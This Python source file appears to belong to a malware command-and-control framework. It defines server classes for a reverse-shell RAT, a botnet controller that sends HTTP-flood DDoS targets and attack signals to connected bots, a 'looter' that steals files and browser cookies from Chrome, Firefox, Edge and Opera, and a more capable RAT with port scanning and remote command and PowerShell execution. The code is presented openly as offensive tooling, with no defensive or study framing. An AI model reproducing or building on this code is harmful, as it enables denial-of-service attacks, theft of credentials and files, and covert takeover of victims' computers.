from .templates import BasicTemplate, AdvTemplate
from .tools.controlers import BasicBotControler, LooterControler, RatControler

from multiprocessing import Pipe
from time import sleep


class Basic(BasicTemplate):
    SERV_TYPE = "Basic"
    SERV_INFO = "Basic Server for test"
    WORM_INFO = "Nothing. Only for dev test"
    def __init__(self, ctrl_pipe: Pipe, conf : dict = {}):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf)


class Echo(BasicTemplate):
    SERV_TYPE = "Echo"
    SERV_INFO = "Echo Server for test. Recive message and send response"
    WORM_INFO = "Connect to server, send 'Hello World' and recive response"
    def __init__(self, ctrl_pipe: Pipe, conf : dict = {}):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf)

class BasicRat(BasicTemplate):
    SERV_TYPE = "BasicRat"
    SERV_INFO = "Server for handling basic rat clients. Handle multpile RAT connection. Send commands and recive response."
    WORM_INFO = "Start the Reverse Shell console, keep connections, catch response and send to server. Include 'pwd' and 'cd' command."
    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf)


class BasicBot(BasicTemplate):
    SERV_TYPE = "BasicBot"
    SERV_INFO = "Server for handling basic botnet clients. Handle multiple BOT connection. Send commands"
    WORM_INFO = "Botnet Client can perform DDOS Attack (Http_Flood). Client can receive commands or act automatically"
    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=BasicBotControler):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, controlers=controlers)
        self.targetAttack = None
        self.signalAttack = None
    
    def acceptConn(self, client: object) -> None:
        if self.targetAttack:
            client.sendMsg(f"tar {self.targetAttack}")
        sleep(0.5)
        if self.signalAttack:
            client.sendMsg("ATT")
    
class GypsyKing(AdvTemplate):
    SERV_TYPE = "GypsyKing"
    SERV_INFO = "Server to handle multiple Looter connection. Search and download files from client"
    WORM_INFO = "Runs in background. Search and Robs files from client. Stealing cookies from: Chrome, Firefox, Edge, Opera, Opera GX"
    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=LooterControler):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, controlers=controlers)


class SigmaRat(AdvTemplate):
    SERV_TYPE = "SigmaRat"
    SERV_INFO = "Server to handle multiple Sigma Rat connection. It has many features such as a port scanner, loading and downloading files from the client, executing commands, scripts, etc."
    WORM_INFO = "PiRat runs in background. Can scan ports on target server, search and robber multiple files. Execute CMD and PS command, PS script etc."
    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=RatControler):
        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, controlers=controlers)